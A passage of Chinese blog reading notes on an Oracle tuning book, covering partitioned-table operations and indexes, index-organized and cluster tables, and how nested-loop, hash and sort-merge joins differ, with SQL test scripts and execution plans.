|     2 |---------------------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   2 - filter(&quot;DEAL_DATE&quot;&gt;=TO_DATE(&#x27; 2024-02-04 00:00:00&#x27;, &#x27;syyyy-mm-dd hh24:mi:ss&#x27;) AND              &quot;DEAL_DATE&quot;&lt;TO_DATE(&#x27; 2024-02-07 00:00:00&#x27;, &#x27;syyyy-mm-dd hh24:mi:ss&#x27;))Note-----   - dynamic statistics used: dynamic sampling (level=2)Statistics----------------------------------------------------------         50  recursive calls          3  db block gets        652  consistent gets          0  physical reads        620  redo size      29086  bytes sent via SQL*Net to client       1508  bytes received via SQL*Net from client         58  SQL*Net roundtrips to/from client          2  sorts (memory)          0  sorts (disk)        853  rows processedSQL&gt; select * from norm_tab where deal_date &gt;= TO_DATE(&#x27;2024-02-04&#x27;, &#x27;YYYY-MM-DD&#x27;) and deal_date &lt; TO_DATE(&#x27;2024-02-07&#x27;, &#x27;YYYY-MM-DD&#x27;);800 rows selected.Elapsed: 00:00:00.21Execution Plan----------------------------------------------------------Plan hash value: 278673677------------------------------------------------------------------------------| Id  | Operation         | Name     | Rows  | Bytes | Cost (%CPU)| Time     |------------------------------------------------------------------------------|   0 | SELECT STATEMENT  |          |  1494 |  2971K|  1596   (1)| 00:00:01 ||*  1 |  TABLE ACCESS FULL| NORM_TAB |  1494 |  2971K|  1596   (1)| 00:00:01 |------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   1 - filter(&quot;DEAL_DATE&quot;&gt;=TO_DATE(&#x27; 2024-02-04 00:00:00&#x27;, &#x27;syyyy-mm-dd              hh24:mi:ss&#x27;) AND &quot;DEAL_DATE&quot;&lt;TO_DATE(&#x27; 2024-02-07 00:00:00&#x27;,              &#x27;syyyy-mm-dd hh24:mi:ss&#x27;))Note-----   - dynamic statistics used: dynamic sampling (level=2)Statistics----------------------------------------------------------         24  recursive calls         27  db block gets       6019  consistent gets          0  physical reads       4456  redo size      27437  bytes sent via SQL*Net to client       1433  bytes received via SQL*Net from client         55  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)        800  rows processed\n\n同样的语句，相似记录的表，分区表的代价仅为129，逻辑读只有652，而普通表代价为1596，逻辑读为6019。差别如此之大，和分区表查询只遍历了13个分区中的一个有关。在分区表查询的执行计划中看到p_start和p_stop都标记上2，表示只遍历了第2个分区。这样避开了对其余12个分区的查询。\n下面来看组合分区相同语句的执行计划。\nSQL&gt; select * from range_list_part_tab where deal_date &gt;= TO_DATE(&#x27;2024-02-04&#x27;, &#x27;YYYY-MM-DD&#x27;) and deal_date &lt; TO_DATE(&#x27;2024-02-07&#x27;, &#x27;YYYY-MM-DD&#x27;);864 rows selected.Elapsed: 00:00:00.30Execution Plan----------------------------------------------------------Plan hash value: 3813662781--------------------------------------------------------------------------------------------------------------| Id  | Operation              | Name                | Rows  | Bytes | Cost (%CPU)| Time     | Pstart| Pstop |--------------------------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT       |                     |   692 |  1376K|   135   (2)| 00:00:01 |       |       ||   1 |  PARTITION RANGE SINGLE|                     |   692 |  1376K|   135   (2)| 00:00:01 |     2 |     2 ||   2 |   PARTITION LIST ALL   |                     |   692 |  1376K|   135   (2)| 00:00:01 |     1 |    10 ||*  3 |    TABLE ACCESS FULL   | RANGE_LIST_PART_TAB |   692 |  1376K|   135   (2)| 00:00:01 |    11 |    20 |--------------------------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   3 - filter(&quot;DEAL_DATE&quot;&gt;=TO_DATE(&#x27; 2024-02-04 00:00:00&#x27;, &#x27;syyyy-mm-dd hh24:mi:ss&#x27;) AND              &quot;DEAL_DATE&quot;&lt;TO_DATE(&#x27; 2024-02-07 00:00:00&#x27;, &#x27;syyyy-mm-dd hh24:mi:ss&#x27;))Note-----   - dynamic statistics used: dynamic sampling (level=2)Statistics----------------------------------------------------------         10  recursive calls          3  db block gets        803  consistent gets          0  physical reads        620  redo size      26324  bytes sent via SQL*Net to client       1533  bytes received via SQL*Net from client         59  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)        864  rows processed\n\n组合分区的代价为135，比范围分区稍高。按理说组合分区的粒度更细，代价应该更低才对，为什么呢？是因为分区数过多，调用有开销。但由于这里表总记录不过10万，全表扫描开销都不是太大，这时Oracle内部调用的开销影响就相对较大。如果表是一张超级大表，比如有上亿，那这些开销相比而言就可以忽略不计了。所以分区表应用在大表会更合适。\n强大的分区操作分区 truncatedelete无法释放空间，而truncate却有效地释放了空间。但可惜的是，针对普通表而言，truncate往往不能轻易使用，因为delete往往是针对某些条件的局部记录删除，而truncate显然不能带上条件，无法做到局部删除。这时分区表就发挥作用了，Oracle可以实现只truncate某个分区，这就等同于实现了局部删除。\nalter table range_part_tab truncate partition p9; 删除分区表range_part_tab的p9分区\n分区数据转移关于分区表的历史记录的处理，其实是可以分成删除和转移两部分的，关于转移备份的方案，Oracle提供了一个非常棒的工具，就是分区交换，可以实现普通表和分区表的某个分区之间数据的相互交换，他们之间的交换非常快，基本上在瞬间就可以完成。实际上只是Oracle在内部数据字典做的一些小改动而已。\n命令：alter table range_part_tab exchange partition p8 with table mid_table; 不过要注意的一点是，这两张表的字段必须是完全一样的。另外，exchange 是交换的含义，两个表的记录会互换，而不是覆盖。\n分区切割alter table range_part_tab split partition p_max at (TO_DATE(&#39;2024-02-01&#39;,&#39;YYYY-MM-DD&#39;)) into (PARTITION p2024_01,PARTITION P_MAX);\n\n分区切割的三个关键字是split、at&#x2F;values和into。\n如果是RANGE类型的，at部分在此处说明了具体的范围，小于某个指定的值。如果是LIST类型的，使用values。\ninto 部分说明分区被切割成两个分区，比如 into (PARTITION p2024_01,PARTITION P_MAX); 表示将 P_MAX 切割成 PARTITION p2024_01 和 PARTITION P_MAX 两部分，其中括号里的 P_MAX 可以改为新的名字，也可以保留原来的名字。\n不能对HASH类型的分区进行拆分。\n\n分区合并alter table range_part_tab merge partitions p2024_02,p_max into partition p_max;\n\n分区合并的关键字是 merge 和 into。\nmerge 后面跟着的是需要合并的两个分区名。\ninto 部分为合并后的分区名，可以是新的分区名，也可以沿用已存在的分区名。\n合并分区是将相邻的分区合并成一个分区，结果分区将采用较高分区的界限，值得注意的是，不能将分区合并到界限较低的分区。\n\n分区的增与删alter table range_part_tab add partition p2025_01 values less than (TO_DATE(&#39;2025-02-01&#39;,&#39;YYYY-MM-DD&#39;));\n上述语句可以增加分区，不过执行会报错：ORA-14074: Partition Bound Must Collate Higher Than That Of The Last Partition这是因为最后一个分区是less than(maxvalue)的情况下，是不能追加分区的，只能SPLIT分裂。因为追加的分区界限比这个p_max还要低，显然不能允许。不过可以改成先试验分区删除，把这个p_max给删除了，然后追加自然就没问题了。\nalter table range_part_tab drop partition p_max;\n\n分区增加的关键字是add partition，而分区别除的关键字是drop partition。\n由于 max value 分区的存在，无法追加新的分区，必须删除了才可以追加。\n\n分区索引类型全局索引全局索引和普通的建索引无异，基本上可以理解为就是普通索引。\ncreate index idx_part_tab_date on range_part_tab(deal_date);\n局部索引局部索引其实就是针对各个分区所建的索引。和局部索引相比，全局索引好比一个大索引，而局部索引好比13个小索引。\ncreate index idx_part_tab_area on range_part_tab(area_code) local;\n分区表相关陷阱索引频频失效其中最容易出问题的当属分区表的不当操作导致分区索引失效，这些操作就是前面分区操作，这些动作全部都会导致分区索引中的全局索引失效。以下是查看range_part_tab表的索引情况，其中STATUS是N&#x2F;A表示是局部索引，需要进一步在user_ind partitions中分析其索引的状态，如下：\n-- 查看索引情况，其中STATUS是N/A表示是局部索引，需要进一步在user_ind_partitions中分析其索引的状态select index_name, statusfrom user_indexeswhere index_name in (&#x27;IDX_PART_TAB_DATE&#x27;, &#x27;IDX_PART_TAB_AREA&#x27;);-- 查看局部索引状态select index_name, partition_name, statusfrom user_ind_partitionswhere index_name = &#x27;IDX_PART_TAB AREA&#x27;;\n\n\nstatus USABLE 表示索引可用，UNUSABLE 表示索引不可用\n\n其实分区表的分区操作，对局部索引一般都没有影响，但是对全局索引影响比较大。Oracle 在提供这些分区操作时提供了一个很有用的参数 update global indexes,可以有效地避免全局索引失效。其实这个参数的本质动作是在分区操作做完后，暗暗执行了索引重建的工作。使用方式：alter table range_part_tab truncate partition p2 update global indexes;\n有索引反而效率更低有时加上索引，分区表的查询效率反而不如普通表。这个问题涉及索引的特性，就是索引的高度一般比较低。下一章索引里细说，下一章有整整136页。索引真是数据库一大知识点啊\n无法应用分区条件在分区设计时，往往没有预先规划好如何应用分区，这是很不应该的。操作分区表时，应该用上分区条件，否则无法做到分区消除，这就浪费了分区表的宝贵特性，应该避免出现。有无分区条件性能差别很大。\n有趣的索引组织表普通堆表操作时，如果有用到索引，需要先从索引中获取rowid,然后定位到表中，获取id以外的其他列，这就是回表。如果查询列含索引列以外的列，回表就不可避免。\n分别建普通表和索引组织表并插入部分数据，其中的organization index关键字就是索引组织表的语法，索引组织表必须有主键。\ndrop table heap_addresses purge;drop table iot_addresses purge;create table heap_addresses(    empno     number(10),    addr_type varchar2(10),    street    varchar2(10),    city      varchar2(10),    state     varchar2(2),    zip       number,    primary key (empno))create table iot_addresses(    empno     number(10),    addr_type varchar2(10),    street    varchar2(10),    city      varchar2(10),    state     varchar2(2),    zip       number,    primary key (empno))    organization indexinsert into heap_addressesselect object_id, &#x27;WORK&#x27;, &#x27;123street&#x27;, &#x27;washington&#x27;, &#x27;DC&#x27;, 20123from all_objects;insert into iot_addressesselect object_id, &#x27;WORK&#x27;, &#x27;123street&#x27;, &#x27;washington&#x27;, &#x27;DC&#x27;, 20123from all_objects;\n\n下面是简单的查询性能比较。\nSQL&gt; select * from heap_addresses where empno = 22;Elapsed: 00:00:00.29Execution Plan----------------------------------------------------------Plan hash value: 128237854----------------------------------------------------------------------------------------------| Id  | Operation                   | Name           | Rows  | Bytes | Cost (%CPU)| Time     |----------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT            |                |     1 |    50 |     1   (0)| 00:00:01 ||   1 |  TABLE ACCESS BY INDEX ROWID| HEAP_ADDRESSES |     1 |    50 |     1   (0)| 00:00:01 ||*  2 |   INDEX UNIQUE SCAN         | SYS_C008415    |     1 |       |     1   (0)| 00:00:01 |----------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   2 - access(&quot;EMPNO&quot;=22)Statistics----------------------------------------------------------          2  recursive calls          3  db block gets          7  consistent gets          0  physical reads        716  redo size        935  bytes sent via SQL*Net to client         83  bytes received via SQL*Net from client          1  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)          1  rows processedSQL&gt; select * from iot_addresses where empno = 22;Elapsed: 00:00:00.33Execution Plan----------------------------------------------------------Plan hash value: 268113143---------------------------------------------------------------------------------------| Id  | Operation         | Name              | Rows  | Bytes | Cost (%CPU)| Time     |---------------------------------------------------------------------------------------|   0 | SELECT STATEMENT  |                   |     1 |    50 |     1   (0)| 00:00:01 ||*  1 |  INDEX UNIQUE SCAN| SYS_IOT_TOP_72627 |     1 |    50 |     1   (0)| 00:00:01 |---------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   1 - access(&quot;EMPNO&quot;=22)Statistics----------------------------------------------------------          1  recursive calls          0  db block gets          4  consistent gets          0  physical reads        140  redo size       1084  bytes sent via SQL*Net to client        108  bytes received via SQL*Net from client          2  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)          1  rows processed\n\n索引组织表的逻辑读是4而普通表的逻辑读是7，另外普通表读取主键索引后，为了获取索引列以外的列信息，产生了回表TABLE ACCESS BY INDEX ROWID，而索引组织表没有。索引组织表最大的特点就是，表就是索引，索引就是表，这是一种很特别的设计，所以无须访问表。不过这种设计的表的更新要比普通表开销更大。因为表要和索引一样有序地排列，更新负担将会非常严重。因此这种设计一般适用在很少更新、频繁读的应用场合，比如配置表，这种表数据一般很少变动，却大量读取。\n簇表的介绍及应用普通表还有一点缺陷，就是ORDER BY语句中的排序不可避免。实际上有序族表可以避免排序。\nDrop table cust_orders;Drop cluster shc;CREATE CLUSTER shc(    cust_id NUMBER,    order_dt timestamp SORT)HASHKEYS 10000HASH IS cust_idSIZE 8192CREATE TABLE cust_orders(    cust_id      number,    order_dt     timestamp SORT,    order_number number,    username     varchar2(30),    ship_addr    number,    bill_addr    number,    invoice_num  number)    CLUSTER shc (cust_id, order_dt)\n\nSQL&gt; set autotrace traceonly explainSQL&gt; variable x numberSQL&gt; select cust_id,order_dt,order_number from cust_orders where cust_id =:x order by order_dt;Elapsed: 00:00:00.31Execution Plan----------------------------------------------------------Plan hash value: 465084913----------------------------------------------------------------------| Id  | Operation         | Name        | Rows  | Bytes | Cost (%CPU)|----------------------------------------------------------------------|   0 | SELECT STATEMENT  |             |     1 |    39 |     0   (0)||*  1 |  TABLE ACCESS HASH| CUST_ORDERS |     1 |    39 |            |----------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   1 - access(&quot;CUST_ID&quot;=TO_NUMBER(:X))Note-----   - dynamic statistics used: dynamic sampling (level=2)\n\n关于避免排序，还有另外一种方法，也是更常见的方法：排序列正好是索引列时，可避免排序。关于索引避免排序这个知识，也会在下一章与索引相关的部分做详细的介绍。簇表和索引组织表一样，由于结构的特殊导致更新操作开销非常大，所以也需要谨慎使用。\n","categories":["读书笔记"],"tags":["数据库","《收获，不止Oracle》","Oracle"]},{"title":"《收获，不止Oracle》读书笔记上篇-表连接","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8A%E6%94%B6%E8%8E%B7%EF%BC%8C%E4%B8%8D%E6%AD%A2Oracle%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%8A%E7%AF%87-%E8%A1%A8%E8%BF%9E%E6%8E%A5/","content":"第六章 - 经典，表的连接学以致用三种连接类型嵌套循环连接（Nested Loop Join）、哈希连接（Hash Join）和排序合并连接（Sort Merge Join）是Oracle数据库中最常用的三种连接算法。\n嵌套循环连接（Nested Loop Join）嵌套循环连接是最简单的连接方法之一，它通过遍历一个表（外部表），对于外部表中的每一行，再遍历另一个表（内部表）来查找匹配的行。\n\n选择一个较小的表作为外部表。通常，外部表是较小的表或已经被索引访问的表。\n遍历外部表的每一行。\n对于外部表中的每一行，遍历内部表以查找匹配的行。如果找到匹配的行，则将这两行组合在一起作为结果的一部分。\n\n当一个表很小或者已经被索引访问时，嵌套循环连接可以非常高效。如果内部表很大，则嵌套循环连接可能会非常慢。对于大数据量的表，嵌套循环连接可能会导致性能问题。\n哈希连接（Hash Join）哈希连接是一种高效的连接算法，它通过在内存中创建哈希表来查找匹配的行。\n\n选择一个较大的表作为内部表。对于内部表中的每一行，根据连接键计算哈希值，并将该行存储在一个哈希表中。\n遍历外部表。对于外部表中的每一行，根据连接键计算哈希值，并在哈希表中查找匹配的行。如果找到匹配的行，则将这两行组合在一起作为结果的一部分。\n\n当内部表可以完全装入内存时很高效，可以处理较大的数据集。但如果内部表太大以至于无法完全装入内存，则性能可能会受到影响。哈希表的构建可能会消耗较多的内存资源。\n排序合并连接（Sort Merge Join）排序合并连接是一种连接算法，它通过先对两个表进行排序，然后通过比较排序后的键值来查找匹配的行。\n\n对两个表按照连接键进行排序。如果表已经排序或可以通过索引访问，则可以跳过此步骤。\n遍历两个排序后的表。比较两个表中当前行的连接键值。如果键值相同，则将这两行组合在一起作为结果的一部分。\n\n当连接键的值有序时，排序合并连接非常高效。可以处理大数据量。但如果表未排序，则需要额外的排序步骤，这可能会消耗时间和磁盘空间。当表很大时，排序可能会很慢。\n各类连接访问次数差异可以使用alter session set statistics_level = all进行跟踪。这条命令用于设置会话级别的统计信息级别。作用是开启尽可能多的统计信息收集，以便于诊断和性能调优。可以知道表的访问次数。\n嵌套循环的表访问次数准备表和数据\nDROP TABLE t1 CASCADE CONSTRAINTS PURGE;DROP TABLE t2 CASCADE CONSTRAINTS PURGE;execute dbms_random.seed(0);create table t1 asSELECT rownum                      id,       rownum                      n,       dbms_random.string(&#x27;a&#x27;, 50) contentsFROM dualCONNECT BY level &lt;= 100ORDER BY dbms_random.random;create table t2 asSELECT rownum                      id,       rownum                      t1_id,       rownum                      n,       dbms_random.string(&#x27;b&#x27;, 50) contentsFROM dualCONNECT BY level &lt;= 100000ORDER BY dbms_random.random;\n\n查看嵌套循环的连接次数。\nSQL&gt; set linesize 1000SQL&gt; alter session set statistics_level = all;Session altered.SQL&gt; SELECT /*+leading(t1) use_nl(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id;-- 省略结果集SQL&gt; select * from table(dbms_xplan.display_cursor(null,null,&#x27;allstats last&#x27;));PLAN_TABLE_OUTPUT-------------------------------------------------------------------------------------------------SQL_ID  f7haq9xwppqqf, child number 0-------------------------------------SELECT /*+leading(t1) use_nl(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_idPlan hash value: 1967407726-------------------------------------------------------------------------------------| Id  | Operation          | Name | Starts | E-Rows | A-Rows |   A-Time   | Buffers |-------------------------------------------------------------------------------------|   0 | SELECT STATEMENT   |      |      1 |        |    100 |00:00:00.33 |   98515 |PLAN_TABLE_OUTPUT-------------------------------------------------------------------------------------------------|   1 |  NESTED LOOPS      |      |      1 |    100 |    100 |00:00:00.33 |   98515 ||   2 |   TABLE ACCESS FULL| T1   |      1 |    100 |    100 |00:00:00.01 |       9 ||*  3 |   TABLE ACCESS FULL| T2   |    100 |      1 |    100 |00:00:00.33 |   98506 |-------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   3 - filter(&quot;T1&quot;.&quot;ID&quot;=&quot;T2&quot;.&quot;T1_ID&quot;)21 rows selected.\n\nStarts 这列表示表访问的次数。这里 t1 被访问了1次，t2 被访问了 100 次。\n下面还有三条不同i情况的语句，就不一一贴详细执行过程，直接说结果了。SELECT /*+leading(t1) use_nl(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n in (17,19); t2 表被访问2次SELECT /*+leading(t1) use_nl(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n 19; t2 表被访问1次SELECT /*+leading(t1) use_nl(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 999999999; t2 表被访问0次\n原因也很简单，和 t1 表中返回的数据数量有关。在嵌套循环连接中，驱动表返回多少条记录，被驱动表就访问多少次。\n此外，这里使用 /*+leading(t1) use_nl(t1 t2)*/ 这个 HINT。其中use_nl表示强制用嵌套循环连接方式。leading(t1)表示强制先访问 t1 表，也就是 t1 表作为驱动表。\n哈希连接的表访问次数SQL&gt; SELECT /*+leading(t1) use_hash(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id;-- 省略结果集SQL&gt; select * from table(dbms_xplan.display_cursor(null,null,&#x27;allstats last&#x27;));PLAN_TABLE_OUTPUT----------------------------------------------------------------------------------------------------------------SQL_ID  bgn80s3r4xwq9, child number 0-------------------------------------SELECT /*+leading(t1) use_hash(t1 t2)*/ * FROM t1,t2 WHERE t1.id =t2.t1_idPlan hash value: 1838229974----------------------------------------------------------------------------------------------------------------| Id  | Operation          | Name | Starts | E-Rows | A-Rows |   A-Time   | Buffers |  OMem |  1Mem | Used-Mem |----------------------------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT   |      |      1 |        |    100 |00:00:00.02 |     994 |       |       |          |PLAN_TABLE_OUTPUT----------------------------------------------------------------------------------------------------------------|*  1 |  HASH JOIN         |      |      1 |    100 |    100 |00:00:00.02 |     994 |  1000K|  1000K| 1329K (0)||   2 |   TABLE ACCESS FULL| T1   |      1 |    100 |    100 |00:00:00.01 |       2 |       |       |          ||   3 |   TABLE ACCESS FULL| T2   |      1 |    100K|    100K|00:00:00.01 |     992 |       |       |          |----------------------------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   1 - access(&quot;T1&quot;.&quot;ID&quot;=&quot;T2&quot;.&quot;T1_ID&quot;)21 rows selected.\n\n在HASH连接中，驱动表和被驱动表都只会访问0次或者1次。\n哈希连接中，只有构建哈希表这一步需遍历驱动表一次。哈希表构建完成后，后续的查找阶段不再需要访问驱动表，而是直接在哈希表中查找匹配项。被驱动表同理。当驱动表中没有符合条件的数据时，便不会访问被驱动表。当查询条件始终不成立时（比如 where 1 &#x3D; 2），也不会访问驱动表。\n排序合并的表访问次数SQL&gt; SELECT /*+ordered use_merge(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id;-- 省略结果集SQL&gt; select * from table(dbms_xplan.display_cursor(null,null,&#x27;allstats last&#x27;));PLAN_TABLE_OUTPUT--------------------------------------------------------------------------------------------------------------------------SQL_ID  bgs49pws4vu8d, child number 0-------------------------------------SELECT /*+ordered use_merge(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_idPlan hash value: 412793182--------------------------------------------------------------------------------------------------------------------------| Id  | Operation           | Name | Starts | E-Rows | A-Rows |   A-Time   | Buffers | Reads  |  OMem |  1Mem | Used-Mem |--------------------------------------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT    |      |      1 |        |    100 |00:00:00.07 |     987 |    982 |       |       |          ||   1 |  MERGE JOIN         |      |      1 |    100 |    100 |00:00:00.07 |     987 |    982 |       |       |          |PLAN_TABLE_OUTPUT--------------------------------------------------------------------------------------------------------------------------|   2 |   SORT JOIN         |      |      1 |    100 |    100 |00:00:00.01 |       2 |      1 | 13312 | 13312 |12288  (0)||   3 |    TABLE ACCESS FULL| T1   |      1 |    100 |    100 |00:00:00.01 |       2 |      1 |       |       |          ||*  4 |   SORT JOIN         |      |    100 |    100K|    100 |00:00:00.07 |     985 |    981 |  9762K|  1209K| 8677K (0)||   5 |    TABLE ACCESS FULL| T2   |      1 |    100K|    100K|00:00:00.05 |     985 |    981 |       |       |          |--------------------------------------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   4 - access(&quot;T1&quot;.&quot;ID&quot;=&quot;T2&quot;.&quot;T1_ID&quot;)       filter(&quot;T1&quot;.&quot;ID&quot;=&quot;T2&quot;.&quot;T1_ID&quot;)PLAN_TABLE_OUTPUT--------------------------------------------------------------------------------------------------------------------------23 rows selected.\n\n在访问次数上，排序合并连接和HASH连接是一样的，两表都只会访问0次或者1次。关于0次的试验这里就不再举例了。排序合并连接根本就没有驱动和被驱动的概念，而嵌套循环和哈希连接要考虑驱动和被驱动情况。\n排序合并连接，也只有在排序时才需要访问表，排序完成后，后续的合并阶段不需要访问表，只需要从排序结果中查找匹配项即可。\n各类连接驱动顺序区别观察两表的前后访问顺序对调后的性能差异。\n嵌套循环的表驱动顺序SELECT /*+leading(t1) use_nl(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19; t1 表被访问 1 次，t2 表被访问 1 次。使用 Buffers 989SELECT /*+leading(t2) use_nl(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19; t1 表被访问 100k 次，t2 表被访问 1 次。使用 Buffers 200k\n在嵌套循环连接中驱动表的顺序非常重要，性能差异十分明显。嵌套循环连接要特别注意驱动表的顺序，小的结果集先访问，大的结果集后访问，才能保证被驱动表的访问次数降到最低，从而提升性能。\n哈希连接的表驱动顺序SELECT /*+leading(t1) use_hash(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19; t1 表被访问 1 次，t2 表被访问 1 次。使用 Buffers 988，Used-Mem 416k ，耗时 0.02sSELECT /*+leading(t2) use_hash(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19; t1 表被访问 1 次，t2 表被访问 1 次。使用 Buffers 988，Used-Mem 13M ，耗时 0.03s\n其中 Buffers 相同，但 Used-Mem 差异非常大，说明排序尺寸差异明显。时间也可以看出一些哈希连接中驱动表的顺序非常重要，性能也差别明显。\n排序合并的表驱动顺序SELECT /*+leading(t1) use_merge(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19; t1 表被访问 1 次，t2 表被访问 100k 次。使用 Buffers 987，Used-Mem 分别是 2048 和 8677k ，耗时 0.04sSELECT /*+leading(t2) use_merge(t2 t1)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19; t1 表被访问 1 次，t2 表被访问 100k 次。使用 Buffers 987，Used-Mem 分别是 2048 和 8677k ，耗时 0.05s\n嵌套循环连接和哈希连接有驱动顺序，驱动表的顺序不同将影响表连接的性能，而排序合并连接没有驱动的概念，无论哪张表在前都无妨。\n各类连接排序情况分析嵌套循环和哈希连接无需排序嵌套循环的执行计划中没有 Used-Mem 信息，说明没有排序。哈希连接也没有排序，虽然执行计划中有 Used-Mem 信息。但消耗的内存是用于建立哈希表的。\n排序只需取部分字段SELECT /*+leading(t1) use_merge(t1 t2)*/ t1.id FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19;SELECT /*+leading(t1) use_merge(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19;\n上面第一条sql只取部分字段，比第二条sql取全部字段所消耗的内存更小。在PGA空间不足以容纳排序区，导致排序需要在磁盘上进行时，那么性能会出现数量级的下降。\n各类连接限制场景对比一般来说 HINT 是 Oracle 提供的用来强制走某执行计划的一个工具，比如你不想让 Oracle 的某查询走索引而要走全表扫描，你使用 full() 的提示就可以达成目的，反之亦是如此。但是如果你用 HINT 将导致 Oracle 的运行结果有错，或者是 Oracle 在特定场景下无法支持这个 HINT 的执行计划，那就无法如你所愿。比如之前的 COUNT(*) 的优化，如果你的索引列没有定义为非空属性，无论如何使用 INDEX() 的 HINT ，都不可能让 Oracle 走索引的，因为索引不能存储空值，用索引来统计将得到一个错误的结果，这是无法容忍的，所以 HINT 是无法生效的。同样，这里与表连接相关的三个 HINT 分别是 use_nl、use_hash 和 use_merge ，如果在特定的写法下，用这些 HINT 也无法达成所愿。\n哈希连接的限制哈希连接不支持不等值连接&lt;&gt;，不支持&gt;和&lt;的连接方式，也不支持LIKE的连接方式。\n排序合并的限制排序合并连接不支持&lt;&gt;的连接条件，也不支持LIKE的连接条件，但是比起哈希连接，支持面要广一些，支持&gt;之类的连接条件。\n嵌套循环无限制嵌套循环支持所有的sql连接条件写法，没有任何限制。\n索引与各表连接经典优化嵌套循环与索引嵌套索引的原理前面有写过，先从驱动表过滤出符合条件的记录，再去被驱动表匹配符合条件的记录，最后将结果组合在一起返回。从两个表中匹配数据的过程可以使用索引提高性能，在过滤条件或连接条件有索引时，可以大大提高查询效率。一般在驱动表的过滤条件加索引、在被驱动表的连接条件加索引比较合理。\n适合嵌套循环连接的场景\n\n两表关联返回的记录不多，最佳情况是驱动表结果集仅返回1条或少量几条记录，而被驱动表仅匹配到1条或少量几条记录，这种情况即便T1表和T2表的记录奇大无比，也是非常迅速的。\n遇到一些不等值查询导致哈希和排序合并连接被限制使用，不得不使用L连接。\n驱动表的限制条件所在的列有索引。\n被驱动表的连接条件所在的列有索引。\n\n哈希连接与索引哈希连接、排序合并连接和嵌套循环连接最大的差别在于，连接条件的索引对它们起不到传递的作用。对于哈希连接和排序合并连接来说，索引的连接条件起不到快速检索的作用，但是限制条件列如果有适合的索引可以快速检索到少量记录，还是可以提升性能的。因此关于哈希连接与索引的关系可以理解为单表索引的设置技巧，这在之前的索引章节中己经详细叙说过了。\n此外两表关联等值查询，在没有任何索引的情况下，Oracle 倾向于走哈希连接这种算法，因为哈希连接的算法本身还是比较高效先进的。哈希连接需要在 PGA 中的HASH AREA SIZE中完成，因此增大HASH AREA SIZE也是优化哈希连接的一种有效的途径，一般在内存自动管理的情况下，只要加大PGA区大小即可。\n排序合并与索引排序合并连接上的连接条件虽然没有检索的作用，却有消除排序的作用。索引本身排序，可以有效地避免排序合并连接中的排序。此外，还有一个和哈希连接类似的优化思路，就是增大内存排序区，避免在排序尺寸过大时在磁盘中排序。\n","categories":["读书笔记"],"tags":["数据库","《收获，不止Oracle》","Oracle"]},{"title":"《收获，不止Oracle》读书笔记上篇-逻辑体系","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8A%E6%94%B6%E8%8E%B7%EF%BC%8C%E4%B8%8D%E6%AD%A2Oracle%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%8A%E7%AF%87-%E9%80%BB%E8%BE%91%E4%BD%93%E7%B3%BB/","content":"第三章 - 神奇，走进逻辑体系世界逻辑体系结构上一章中讲的Oracle体系的物理结构都是一些看得见摸到着的东西。登录数据库所在的主机，实实在在地体验了SGA共享内存段是如何被开辟而又如何消亡、后台进程是如何被唤起而又如何退出。此外也清楚地看到了数据文件、参数文件、控制文件、日志文件、归档文件的大小及位置。因此物理结构实质上可以理解为我们在物理上可以实实在在看得见的东西。\n而这一章说的体系结构的逻辑结构正是从体系物理结构图中的数据文件部分展开描述的。如下图圆圈标记处所示\n\n这里数据文件是存放数据之处，也是数据库存在的根本！下面介绍的逻辑结构是：表空间(TABLESPACE)、段(SEGMENT)、区(EXTENT)、块(BLOCK)。ORACLE SERVER 正是条理地通过表空间以及段、区、块控制磁盘空间的合理高效的使用，看下图\n\n数据库(DATABASE)由若干表空间(TABLESPACE)组成，表空间(TABLESPACE)由若干段(SEGMENT)组成，段(SEGMENT)由若干区(EXTENT)组成，区(EXTENT)又是由Oracle的最小单元块(BLOCK)组成的。其中表空间又包含系统表空间、回滚段表空间、临时表空间、用户表空间。除了用户表空间外其他三种表空间有各自特定的用途，不可随意更改和破坏，尤其是系统表空间更是需要小心谨慎保护。\n\n块 -&gt; 区 -&gt; 段 -&gt; 表空间 -&gt; 